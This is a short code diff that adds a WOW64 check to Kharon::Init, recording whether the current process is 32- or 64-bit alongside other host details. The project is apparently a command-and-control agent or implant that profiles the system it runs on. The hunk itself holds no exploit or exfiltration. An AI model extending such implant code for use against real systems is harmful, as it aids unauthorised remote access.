@@ -212,6 +212,7 @@ auto DECLFN Kharon::Init(
     /* ========= [ informations collection ] ========= */
     CHAR   cProcessorName[MAX_PATH] = { 0 };
 
+    BOOL   IsWow64      = FALSE;
     ULONG  TmpVal       = 0;
     ULONG  TokenInfoLen = 0;
     HANDLE TokenHandle  = nullptr;
@@ -242,6 +243,14 @@ auto DECLFN Kharon::Init(
 
     this->Mm->PageSize = SysInfo.dwPageSize;
     this->Mm->PageGran = SysInfo.dwAllocationGranularity;
+
+    this->Krnl32.IsWow64Process( NtCurrentProcess(), &IsWow64 );
+
+    if ( IsWow64 ) {
+        this->Session.ProcessArch = 0x86;
+    } else {
+        this->Session.ProcessArch = 0x64;
+    }
 
 	if ( 
 		SysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 || 
